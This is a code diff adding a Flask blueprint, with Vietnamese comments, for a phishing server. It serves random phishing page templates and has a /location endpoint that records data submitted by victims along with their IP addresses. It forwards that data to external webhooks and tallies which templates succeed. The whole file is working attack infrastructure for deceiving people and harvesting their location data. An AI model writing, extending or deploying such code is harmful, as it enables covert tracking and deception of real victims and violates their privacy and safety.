@@ -1,0 +1,38 @@
+import os
+import json
+from flask import Blueprint, request, jsonify, render_template_string
+from config import TEMPLATES_DIR
+
+phishing_bp = Blueprint('phishing', __name__)
+
+@phishing_bp.route('/')
+def serve_phishing_page():
+    template_svc = phishing_bp.app.config['template_service']
+    filename = template_svc.get_random_template()
+    if not filename:
+        return "No active template", 500
+    filepath = os.path.join(TEMPLATES_DIR, filename)
+    if not os.path.exists(filepath):
+        return "Template file missing", 500
+    with open(filepath, 'r', encoding='utf-8') as f:
+        html = f.read()
+    # Inject thêm script để gửi template_name nếu muốn
+    return html
+
+@phishing_bp.route('/location', methods=['POST'])
+def capture_location():
+    data = request.get_json(silent=True) or {}
+    # Thêm IP của nạn nhân
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    # Gọi victim service
+    victim_svc = phishing_bp.app.config['victim_service']
+    result = victim_svc.record(data, ip)
+    # Gửi webhook
+    webhook_svc = phishing_bp.app.config['webhook_service']
+    webhook_svc.send_all(data)
+    # Cập nhật template success nếu có
+    template_name = data.get('template')
+    if template_name:
+        template_svc = phishing_bp.app.config['template_service']
+        template_svc.update_success(template_name)
+    return jsonify({"status": "ok"})
